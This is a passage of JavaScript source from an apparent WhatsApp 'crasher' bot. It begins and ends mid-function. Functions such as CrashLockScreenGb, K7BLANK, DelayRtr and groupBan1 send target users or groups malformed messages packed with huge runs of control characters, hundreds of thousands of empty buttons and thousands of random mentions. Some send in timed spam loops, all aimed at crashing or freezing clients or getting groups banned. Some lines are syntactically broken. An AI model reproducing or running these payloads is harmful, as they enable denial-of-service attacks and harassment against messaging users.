    const startTime2 = Date.now();
    const duration2 = 1 * 60 * 1000;

    while (Date.now() - startTime2 < duration2) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0003".repeat(75000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 8000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { participant: target });
    }

    const LexzyyMsg = {
        interactiveMessage: {
            body: {
                text: "Skylinnereal - Executed¿!",
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 700000 }, () => ({}))
            },
            contextInfo: {
                quotedMessage: {
                    orderMessage: {
                        orderTitle: "Pt Ghost X",
                        itemCount: 1999,
                        totalAmount1000: "1000000",
                        totalCurrencyCode: "IDR"
                    },
                },
            },
        },
    };

    const acamsg = generateWAMessageFromContent(target, LexzyyMsg, {});

    await sock.relayMessage(target, acamsg.message, {
        participant: target,
        messageId: acamsg.key.id
    });

    const Lexca = {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            botMetadata: {
                pluginMetadata: {},
                richResponseSourcesMetadata: {
                    sources: []
                }
            }
        },
        groupStatusMessageV2: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 3,
                            tableMetadata: {
                                title: "Skylinne - Executed¿!",
                                rows: Array.from({ length: 2000 }, () => ({}))
                            }
                        }
                    ],
                    unifiedResponse: {
                        data: JSON.stringify({
                            response_id: crypto.randomUUID(),
                            sections: []
                        })
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "GhostXExecutedXAllTeam"
                        },
                        forwardOrigin: 3
                    }
                }
            }
        }
    };

    const Lexcaa = generateWAMessageFromContent(target, Lexca, {});

    await sock.relayMessage(target, Lexcaa.message, {
        participant: target,
        messageId: Lexcaa.key.id
    });

    await sock.relayMessage(target, {
        interactiveMessage: {
            nativeFlowMessage: {
                buttons: [{
                    name: "payment_info",
                    buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\x10' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\x10","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
                }]
            }
        }
    }, {});

    await sock.relayMessage(target, {
        view0nceMessageV2: {
            message: {
                extendedTextMessage: {
                    text: "\u0003".repeat(9000),
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 2000 },
                                () => "5" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                            )
                        ]
                    }
                }
            }
        }
    }, { participant: target });

    const Lexcabos = {
        groupStatusMessageV2: {
            message: {
                stickerPackMessage: {
                    stickerPackId: "\u0000".repeat(9000),
                    name: "Skylinne - Executed¿!",
                    publisher: "\u0000".repeat(9000),
                    fileLength: 9999,
                    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                    mimetype: "image/webp",
                    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                    contextInfo: {
                        statusAttributionType: 2,
                        statusAttributions: Array.from({ length: 450000 }, () => ({ type: 1 }))
                    },
                },
            },
        },
    };

    await sock.relayMessage(target, Lexcabos, {
        participant: target,
    });

    const startTime3 = Date.now();
    const duration3 = 4 * 60 * 1000;
    while (Date.now() - startTime3 < duration3) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "Skylinne - Executed¿!"
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        },
                    },
                },
            },
        }, { participant: target });

        await new Promise(resolve => setTimeout(resolve, 900));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "ExecutedTeam",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\u0003".repeat(9000),
                            version: 3
                        },
                    }
                }
            }
        }, { participant: target });

        await new Promise(resolve => setTimeout(resolve, 900));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "GhostCrasher - Executed‽!",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(9000),
                            version: 3
                        },
                    }
                }
            }
        }, { participant: target });

        await new Promise(resolve => setTimeout(resolve, 900));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "Skylinnereal - Executed¿!",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "address_message",
                            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"mmklu","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(9000)}"}}`,
                            version: 3
                        },
                        contextInfo: {
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 2,
                                    expiryTimestamp: Math.floor(Date.now() / 1999) + 8640000
                                }
                            }
                        }
                    }
                }
            }
        }, { participant: target });

        await new Promise(resolve => setTimeout(resolve, 900));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0003".repeat(9000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 1999 },
                                    () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                                )
                            ]
                        }
                    }
                }
            }
        }, { participant: target });
    }

    const LexzyExe = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Skylinnne - Executed¿!"
                    },
                    nativeFlowMessage: {
                        buttons: "{}".repeat(75000),
                    },
                },
            },
        },
    };

    const Lexx = generateWAMessageFromContent(target, LexzyExe, {});

    await sock.relayMessage(target, Lexx.message, {
        participant: target,
        messageId: Lexx.key.id
    });

    const ocha = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Skylinne - Executed¿!",
                    },
                    nativeFlowMessage: {
                        buttons: "[".repeat(75000),
                    },
                },
            },
        },
    };

    const iniocha = generateWAMessageFromContent(target, ocha, {});

    await sock.relayMessage(target, iniocha.message, {
        participant: target,
        messageId: iniocha.key.id
    });
}

async function CatalogBug(sock, groupJid) {
  console.log(`target: ${groupJid}`);
  
  await sock.relayMessage(groupJid, {
    interactiveMessage: {
      body: { text: "p" },
      nativeFlowMessage: {
        buttons: [
          {
            name: "catalog_message",
            buttonParamsJson: "{}"
          }
        ],
        messageParamsJson: "{}"
      }
    }
  }, {
    additionalNodes: [
      {
        tag: "biz",
        attrs: {
          native_flow_name: "catalog_message"
        }
      }
    ]
  });
  
  console.log(`Catalog bug sent to ${groupJid} - done`);
}

async function CrashLockScreenGb(sock, groupJid) {
  console.log(`target: ${groupJid}`);

  const msg1 = await generateWAMessageFromContent(
    groupJid,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "- # GhostCrash3r ん.? " +
              "ោ៝".repeat(25000) +
              "ꦾ".repeat(25000) +
              "@5".repeat(50000),
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 2000 },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
              stanzaId: "123",
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000,
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid:
                    Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Bot",
                },
              },
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamJson: JSON.stringify({
                    status: true,
                  })
                },
                {
                  name: "mpm",
                  buttonParamJson: JSON.stringify({
                    status: true,
                  })
                },
              ],
            },
          },
        },
      },
    },
    {}
  );
  
  const msg2 = generateWAMessageFromContent(groupJid, {
    viewOnceMessageV2: {
      message: {
        listResponseMessage: {
          title: "- # GhostCrash3r ん.? " + "ꦾ".repeat(5000),
          listType: 4,
          buttonText: { displayText: "🩸" },
          sections: [],
          singleSelectReply: {
            selectedRowId: "⌜⌟"
          },
          contextInfo: {
            participant: groupJid,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "- # GhostCrash3r ん.? ",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
              }
            },
            externalAdReply: {
              title: "☀️",
              body: "🩸",
              mediaType: 1,
              renderLargerThumbnail: false,
              nativeFlowButtons: [
                {
                  name: "payment_info",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
              ],
            },
            extendedTextMessage: {
            text: "ꦾ".repeat(20000) + "@1".repeat(20000),
            contextInfo: {
              stanzaId: groupJid,
              participant: groupJid,
              quotedMessage: {
                conversation:
                  "Bokep-Jepang" +
                  "ꦾ࣯࣯".repeat(50000) +
                  "@1".repeat(20000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
           participant: groupJid, 
          }
        }
      }
    }
  }, {});
  
  const msg3 = await generateWAMessageFromContent(
    groupJid,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: { 
            header: {
              title: "ꦾ࣯࣯".repeat(50000),
              locationMessage: {
                degreesLatitude: 0,
                degreesLongitude: 0,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "Bokep-Indonesia" +
              "ោ៝".repeat(25000) +
              "ꦾ".repeat(25000) +
              "@5".repeat(50000),
             },
             nativeFlowMessage: {
               messageParamJson: "{[".repeat(50000),
               buttons: [
                 { name: "cta_call",
                 buttonParamsJson: JSON.stringify({ status: true }) },
                { name: "cta_copy",    
                buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(50000) }) },
               { name: "quick_reply", 
               buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(50000) }) },
               ],
             },
           },
         },
       },
     },
     {}
  );
  
  await sock.relayMessage(groupJid, msg1.message, {
    messageId: msg1.key.id,
    participant: { jid: groupJid },
  });
  
  await sock.relayMessage(groupJid, msg2.message, {
    messageId: msg2.key.id,
    participant: { jid: groupJid },
  });
  
  await sock.relayMessage(groupJid, msg3.message, {
    participant: { jid: groupJid },
    messageId: msg3.key.id,
  });
  
  console.log(`crash sent to ${groupJid} - done`);
}

async function frezeenewinvis(sock, target) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "#skylinne"
                    },
                    body: {
                        text: "[{".repeat(1000) + "}]".repeat(1000)
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg, { noSelfSync: true });
}

async function fcGrup(sock, target) {
  const Msg1 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "hai i am skylinne",
            format: "NONE"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(15000),   
            version: 3
          },
          contextInfo: {
            participant: target,
            remoteJid: groupJid,
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: "PAYMENT_INVITE",
                expiryTimestamp: 9999999999       
              }
            },
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 9999
          }
        }
      }
    },
    futureProofMessage: {
      version: 999,
      message: {
        text: "\u0000".repeat(50000)
      }
    }
  };

  const Omek = await sock.generateWAMessageFromContent(groupJid, Msg1, {});

  await sock.relayMessage(
    groupJid, 
    Omek.message, 
    {
      messageId: Omek.key.id
    }
  );
}

async function DelayRtr(sock, target) {
    try {
        const rtr = "Skylinne ".repeat(999999);
        const v2rtr = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: { text: rtr },
                        nativeFlowMessage: {
                            name: "payment_key_info",
                            buttonParamsJson: JSON.stringify({
                                info: rtr
                            })
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, v2rtr, {
            participant: { jid: target }
        });

        console.log(" Sukses Terkirim");
    } catch (err) {
        console.error("Error: " + err.message);
    }
}

async function crashX(sock, target) {
    const MakLo = {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            botMetadata: {
                pluginMetadata: {},
                richResponseSourcesMetadata: {
                    sources: []
                }
            }
        },
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 4,
                            tableMetadata: {
                                title: "Skylinne",
                                rows: "\0",
                            }
                        }
                    ],
                    unifiedResponse: {
                        data: JSON.stringify({
                            response_id: crypto.randomUUID(),
                            sections: []
                        })
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "CRB"
                        },
                        forwardOrigin: 4
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, MakLo, {});

    await sock.relayMessage(target, msg.message, {
    participant: true,
    messageId: msg.key.id
    });
}

async function K7BLANK(sock, target) {
  const unicode = "\u200B".repeat(30000);
  
  for (let i = 0; i < 20; i++) {
    await sock.relayMessage(target, {
      interactiveMessage: {
        body: { text: "./" + "\u0000".repeat(50000) },
        nativeFlowMessage: {
          buttons: [
            ...Array.from({ length: 450000 }, () => ({})),
            "ી".repeat(500000)
          ]
        },
        contextInfo: { mentionedJid: [target] }
      }
    }, {});
    
    await sock.relayMessage(target, {
      interactiveMessage: {
        body: { text: unicode },
        nativeFlowMessage: {
          buttons: [
            {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                flow_message_version: "3",
                flow_token: JSON.stringify({ ticket_id: "876444465502832" + "𑇂𑆵𑆴𑆿".repeat(1000) }),
                flow_id: "1850997912185503",
                flow_cta: "𑇂𑆵𑆴𑆿".repeat(10000),
                flow_action: "navigate",
                flow_action_payload: {
                  screen: "SATISFACTION_SCREEN",
                  data: {
                    title: "𑲱".repeat(2000),
                    continue_label: "𑜦𑜠".repeat(2000),
                    satisfaction_screen_question: "ꦾ".repeat(3000),
                    very_satisfied_label: "𑇂𑆵𑆴𑆿".repeat(2000),
                    slightly_satisfied_label: "𑜦𑜠".repeat(2000),
                    neutral_label: "𑲱".repeat(2000),
                    slightly_dissatisfied_label: "ꦾ".repeat(2000),
                    very_dissatisfied_label: "𑇂𑆵𑆴𑆿".repeat(2000),
                    helpfulness_screen_question: "𑲱".repeat(3000),
                    very_helpful_label: "𑇂𑆵𑆴𑆿".repeat(2000),
                    slightly_helpful_label: "𑜦𑜠".repeat(2000),
                    slightly_unhelpful_label: "ꦾ".repeat(2000),
                    very_unhelpful_label: "𑲱".repeat(2000),
                    question_answered_screen_question: "𑇂𑆵𑆴𑆿".repeat(3000),
                    yes_label: "𑲱".repeat(2000),
                    no_label: "ꦾ".repeat(2000),
                    improvement_suggestion_label: "𑇂𑆵𑆴𑆿".repeat(2000),
                    submit_label: "𑜦𑜠".repeat(2000)
                  }
                },
                flow_metadata: {
                  flow_json_version: 700,
                  data_api_protocol: null,
                  data_api_version: null,
                  flow_name: "𑇂𑆵𑆴𑆿".repeat(1000),
                  creation_source: "CSAT",
                  categories: []
                },
                icon: "DEFAULT",
                has_multiple_buttons: false
              })
            }
          ]
        },
        contextInfo: { mentionedJid: [target] }
      }
    }, {});
    
    await new Promise(r => setTimeout(r, 100));
  }
}

async function Spamdelay(sock, target) {
    try {
        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: {
                        interactiveMessage: {
                            body: {
                                text: "Skylinne"
                            },
                            nativeFlowMessage: {
                                buttons: Array.from({ length: 500000 }, () => ({}))
                            },
                            contextInfo: {
                                quotedMessage: {
                                    stickerPackMessage: {}
                                }
                            }
                        }
                    }
                }
            },
            {
                participant: { jid: target }
            }
        );
    } catch (error) {
        console.error("Err:", error.message);
    }
}

async function iniochamy(sock, target) {
  const iniochamy = {
    viewOnceMessage: {
      message: {
        videoMessage: {
          mimetype: "video/mp4",
          fileLength: "17381601",
          title: " jir iniochamy ",
          fileName: " iniochamy " + "ꦽ".repeat(75000),
          fileSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
          fileEncSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
          mediaKey: "s4SdSzN3zwaZNv1+jcXtAQdCc8AIm879E9+CwdN8VfI2",
          directPath: "/v/t62.7119-24/fake.enc",
          mediaKeyTimestamp: "1767975195",
          url: "https://mmg.whatsapp.net/d/fake.enc",
          caption: "ꦾ".repeat(75000) + "ꦽ".repeat(75000)
        }
      }
    }
  };

  const iniochamyy = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: " ochamy suka duit " + "ြ".repeat(100000)
          },
          contextInfo: {
            stanzaId: "metawai_id",
            forwardingScore: 999,
            participant: target,
            mentionedJid: Array.from({ length: 2000 }, () => 
              "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            )
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", iniochamy, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ 
          tag: "to", 
          attrs: { jid: target }, 
          content: undefined 
        }]
      }]
    }]
  });

  await sock.relayMessage("status@broadcast", iniochamyy, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ 
          tag: "to", 
          attrs: { jid: target }, 
          content: undefined 
        }]
      }]
    }]
  });
}

async function FrezeChatOrder(sock, target) {
const CrBZD = {
interactiveMessage: {
body: {
text: "gw skylinne"
},
nativeFlowMessage: {
buttons: Array.from({ length: 500000 }, () => ({}))
},
contextInfo: {
quotedMessage: {
orderMessage: {
orderTitle: "PAKET",
itemCount: 9999,
totalAmount9999: "999999999999",
totalCurrencyCode: "IDR"
},
},
},
},
};

const CrbX = generateWAMessageFromContent(target, CrBZD, {});

await sock.relayMessage(target, CrbX.message, {
participant: true,
messageId: CrbX.key.id
})
}

async function unknowbuts(sock, target) {
  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 3
          },
          interactiveMessage: {
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              }
            },
            body: {
              text: "\x10".repeat(5000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: Array.from({ length: 500000 }, () => ({}))
            }
          }
        }
      }
    },
    {
      participant: true
    }
  );
}

async function delayHard1(sock, target) {
    const a = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "¡m ⟅༑ ‌‌‌E‌x‌f‌o‌l‌d‌ ‌D‌e‌l‌a‌y ‌h‌a‌r‌d ♞" + "\0".repeat(25000)
                    },
                     nativeFlowmessage: {
                         buttons: "\x10". repeat(3000)
                     }
                }
            }
        }
    };
         const b = {
            groupStatusMessageV2: {
               message: {
                 interactiveMessage: {
                      body: {
                         text: "𐌐𝖚𝗍𝗋𝗂 𝖫𝗈𝗏𝖾𝗋𝗌" + "\n".repeat(5000)
                     },
                      nativeFlowMessage: {
                          buttons: Array.from({ length: 500000 }, () => ({}))
                      }
                 }
             }
         }
     };
        const c = {
          groupStatusMessageV2: {
              message: {
                  extendedTextMessage: {
                      text: "福 | ᥅ᥲᥡᘔᥱ𝗍һ - 𐌊𐌉𐌍𐌂",
                       contextInfo: {
                          mentionedJid: Array.from({    length: 2000 }, () =>
    Math.floor(Math.random() * 700000) + "@s.whatsapp.net"
                       )
                   }
                }
            }
        }
    }; 
      await sock.relayMessage(target, a, {})
      await sock.relayMessage(target, b, {})
      await sock.relayMessage(target, c, {
      });
       participant: {
          true
     }
}

async function K7(sock, target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: '12345678@newsletter',
          newsletterName: 'Ghost X' + 'ោ៝'.repeat(7500),
          caption: 'Ghost X' + 'ោ៝'.repeat(7500),
          inviteExpiration: Date.now() + 1814400000,
          contextInfo: {
            participant: target,
            mentionedJid: [
              '0@s.whatsapp.net',
              ...Array.from({ length: 1900 }, () =>
                '1' + Math.floor(Math.random() * 5000000) + '@s.whatsapp.net'
              )
            ],
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              },
              forwardedAiBotMessageInfo: {
                number_999999: "DATA_MEDIA",
                botName: 'lawak',
                botJid: Math.floor(Math.random() * 5000000) + '@s.whatsapp.net',
                creatorName: 'skylinne',
                liveLocationMessage: {
                  degreesLatitude: -1e309,
                  degreesLongitude: 1e309,
                  accuracyInMeters: 999999999,
                  speedInMps: 1,
                  degreesClockwiseFromMagneticNorth: 999999999,
                  caption: "\u0000".repeat(50000),
                  sequenceNumber: 999999999,
                  timeOffset: Date.now()
                }
              }
            }
          }
        }
      }
    }
  };
  await sock.relayMessage(target, msg, {});
}

async function LexcaabosV3(sock, target) {
    const Lexcaabos = {
        interactiveMessage: {
            body: {
                text: "Skylinne - Executed¿!",
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 550000 }, () => ({}))
            },
            contextInfo: {
                quotedMessage: {
                    albumMessage: {
                        expectedImageCount: 99999,
                        expectedVideoCount: 99999
                    },
                },
            },
        },
    };

    const Lexca = generateWAMessageFromContent(target, Lexcaabos, {});

    await sock.relayMessage(target, Lexca.message, {
        participant: true,
        messageId: Lexca.key.id
    });

    const Lexcabos = {
        interactiveMessage: {
            body: {
                text: "Skylinne - Executed¿!",
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 850000 }, () => ({}))
            },
            contextInfo: {
                quotedMessage: {
                    orderMessage: {
                        orderTitle: "Ghost X",
                        itemCount: 9999,
                        totalAmount1000: "10000000",
                        totalCurrencyCode: "IDR"
                    },
                },
            },
        },
    };

    const Lexcaabos2 = generateWAMessageFromContent(target, Lexcabos, {});

    await sock.relayMessage(target, Lexcaabos2.message, {
        participant: true,
        messageId: Lexcaabos2.key.id
    });

    await sock.relayMessage(target, {
        interactiveMessage: {
            body: {
                text: "Skylinne - Executed¿!",
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 850000 }, () => ({}))
            }
        }
    }, { participant: true });

    await sock.relayMessage(target, {
        interactiveMessage: {
            body: {
                text: "Skylinne - Executed¿!",
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 850000 }, () => ({}))
            },
            contextInfo: {
                quotedMessage: {
                    videoMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0&mms3=true",
                        mimetype: "video/mp4",
                        caption: "IamLexzyMods",
                        fileSha256: "LdNOQNcNIvlIijHvkpwRIY/zIoTfWQoFux7dzTHusyM=",
                        fileLength: "1099511627776",
                        seconds: 172800,
                        mediaKey: "G2MGbP7BZLi1RwpyyV4DeXtfttaclMVSKfqNldZDt20=",
                        height: 1080,
                        width: 1920,
                        fileEncSha256: "U4uKZrZeJpg8smAcMRT3qtPoviAp/dqGa63GzqYcS8E=",
                        directPath: "/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1774428565",
                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIQQgIkQVFS/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6Zz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABEQACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAAAAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z",
                        annotations: [
                            {
                                polygonVertices: [
                                    {
                                        x: 0.17499999701976776,
                                        y: 0.3379453122615814
                                    },
                                    {
                                        x: 0.824999988079071,
                                        y: 0.3379453122615814
                                    },
                                    {
                                        x: 0.824999988079071,
                                        y: 0.6620468497276306
                                    },
                                    {
                                        x: 0.17499999701976776,
                                        y: 0.6620468497276306
                                    }
                                ],
                                shouldSkipConfirmation: true,
                                embeddedContent: {
                                    embeddedMusic: {
                                        musicContentMediaId: "2261401457948346",
                                        songId: "849859527815275",
                                        author: "Skylinne - Executed¿!" + "ြ".repeat(9000),
                                        title: "ြ".repeat(75000),
                                        artworkDirectPath: "/v/t62.76458-24/568311115_4528169627440664_4559757974106869948_n.enc?ccb=11-4&oh=01_Q5Aa5AGs28VMFVXkcn0w9n-YUhiBwEPKyIwEcjWZLHm7mUgOsQ&oe=6A786B6E&_nc_sid=5e03e0",
                                        artworkSha256: "FROyKnRoHfLzDwmz5tED8K3nmdK+4Uihn2ucHBZDjPI=",
                                        artworkEncSha256: "y/SkheY3BoGhndQlmR6icfLtMtI4FjjRi5y3bsX13jw=",
                                        artworkMediaKey: "s5VCH/gb/YjDXhek47MVcsHjVV3/lOHOYaDe72eodXw=",
                                        artistAttribution: "https://www.instagram.com/_u/lexzymods",
                                        countryBlocklist: "WEs=",
                                        isExplicit: false
                                    }
                                },
                                embeddedAction: true
                            }
                        ]
                    }
                }
            }
        }
    }, {});

    await sock.relayMessage(target, {
        interactiveMessage: {
            header: {
                title: "Null",
                subtitle: "ြ ".repeat(75000),
                hasMediaAttachment: true
            },
            body: { text: "ြ ".repeat(9000) },
            footer: { text: "ြ ".repeat(9000) },
            nativeFlowMessage: {
                buttons: [{
                    name: "single_select",
                    buttonParamsJson: JSON.stringify({
                        title: "Null",
                        sections: [{
                            title: "List",
                            rows: [{ title: "Skylinne - Executed¿!", id: "3" }]
                        }]
                    })
                }]
            }
        }
    }, {});
}

async function groupBan1(sock, target) {
    if (!target.endsWith("@g.us")) {
        throw new Error("@g.us server required");
    }

    const fakeNumbers = [
        "6280000000000@s.whatsapp.net",
        "14155552671@s.whatsapp.net",
        "447400000000@s.whatsapp.net",
        "61400000000@s.whatsapp.net",
        "6281234567890@s.whatsapp.net",
        "6287873499996@s.whatsapp.net",
        "6285655555555@s.whatsapp.net",
        "6289876543210@s.whatsapp.net",
        "6281111111111@s.whatsapp.net",
        "6282222222222@s.whatsapp.net",
        "6283333333333@s.whatsapp.net",
        "6284444444444@s.whatsapp.net",
        "6285555555555@s.whatsapp.net",
        "6286666666666@s.whatsapp.net",
        "6287777777777@s.whatsapp.net",
        "6288888888888@s.whatsapp.net",
        "6289999999999@s.whatsapp.net"
    ];

    const actions = ["add", "remove", "promote", "demote"];
    const fake = fakeNumbers[Math.floor(Math.random() * fakeNumbers.length)];
    const action = actions[Math.floor(Math.random() * actions.length)];

    try {
